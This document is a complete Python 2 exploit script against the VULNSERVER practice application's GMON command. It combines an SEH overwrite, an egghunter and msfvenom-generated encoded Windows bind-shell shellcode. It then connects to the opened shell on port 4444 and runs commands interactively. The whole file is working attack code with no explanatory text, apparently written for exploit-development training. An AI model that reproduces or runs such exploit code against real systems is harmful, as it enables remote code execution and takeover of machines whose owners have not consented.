#!/usr/bin/python
import socket
import time
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host= sys.argv[1]
port=9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)

egg = "T00WT00W"

# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00" EXITFUNC=thread -f c
shellcode = (
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\xda\xd2\xba\xbb\xa4\xf8\xec\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
        "\x53\x83\xee\xfc\x31\x56\x13\x03\xed\xb7\x1a\x19\xed\x50\x58"
        "\xe2\x0d\xa1\x3d\x6a\xe8\x90\x7d\x08\x79\x82\x4d\x5a\x2f\x2f"
        "\x25\x0e\xdb\xa4\x4b\x87\xec\x0d\xe1\xf1\xc3\x8e\x5a\xc1\x42"
        "\x0d\xa1\x16\xa4\x2c\x6a\x6b\xa5\x69\x97\x86\xf7\x22\xd3\x35"
        "\xe7\x47\xa9\x85\x8c\x14\x3f\x8e\x71\xec\x3e\xbf\x24\x66\x19"
        "\x1f\xc7\xab\x11\x16\xdf\xa8\x1c\xe0\x54\x1a\xea\xf3\xbc\x52"
        "\x13\x5f\x81\x5a\xe6\xa1\xc6\x5d\x19\xd4\x3e\x9e\xa4\xef\x85"
        "\xdc\x72\x65\x1d\x46\xf0\xdd\xf9\x76\xd5\xb8\x8a\x75\x92\xcf"
        "\xd4\x99\x25\x03\x6f\xa5\xae\xa2\xbf\x2f\xf4\x80\x1b\x6b\xae"
        "\xa9\x3a\xd1\x01\xd5\x5c\xba\xfe\x73\x17\x57\xea\x09\x7a\x30"
        "\xdf\x23\x84\xc0\x77\x33\xf7\xf2\xd8\xef\x9f\xbe\x91\x29\x58"
        "\xc0\x8b\x8e\xf6\x3f\x34\xef\xdf\xfb\x60\xbf\x77\x2d\x09\x54"
        "\x87\xd2\xdc\xc1\x8f\x75\x8f\xf7\x72\xc5\x7f\xb8\xdc\xae\x95"
        "\x37\x03\xce\x95\x9d\x2c\x67\x68\x1e\x43\x24\xe5\xf8\x09\xc4"
        "\xa3\x53\xa5\x26\x90\x6b\x52\x58\xf2\xc3\xf4\x11\x14\xd3\xfb"
        "\xa1\x32\x73\x6b\x2a\x51\x47\x8a\x2d\x7c\xef\xdb\xba\x0a\x7e"
        "\xae\x5b\x0a\xab\x58\xff\x99\x30\x98\x76\x82\xee\xcf\xdf\x74"
        "\xe7\x85\xcd\x2f\x51\xbb\x0f\xa9\x9a\x7f\xd4\x0a\x24\x7e\x99"
        "\x37\x02\x90\x67\xb7\x0e\xc4\x37\xee\xd8\xb2\xf1\x58\xab\x6c"
        "\xa8\x37\x65\xf8\x2d\x74\xb6\x7e\x32\x51\x40\x9e\x83\x0c\x15"
        "\xa1\x2c\xd9\x91\xda\x50\x79\x5d\x31\xd1\x99\xbc\x93\x2c\x32"
        "\x19\x76\x8d\x5f\x9a\xad\xd2\x59\x19\x47\xab\x9d\x01\x22\xae"
        "\xda\x85\xdf\xc2\x73\x60\xdf\x71\x73\xa1"
        )

short_jmp = "\xEB\x08\x90\x90"

A = egg + shellcode +  "A" * (3522 - len(short_jmp) - len(egg) - len(shellcode)) + short_jmp

#625010B4   5B               POP EBX
#625010B5   5D               POP EBP
#625010B6   C3               RETN
PPR = "\xB4\x10\x50\x62"

egghunter = (
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x66\x81\xca\xff\x0f\x42\x52\x6a"
        "\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x54\x30\x30\x57\x8b\xfa"
        "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        )

C = egghunter + "C" * (5000 - len(A) - len(PPR) - len(egghunter))

buffer = "GMON /" + A + PPR + C
print "[+] Sending exploit buffer"
s.send(buffer)

print "[+] Waiting for shell."
time.sleep(2)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
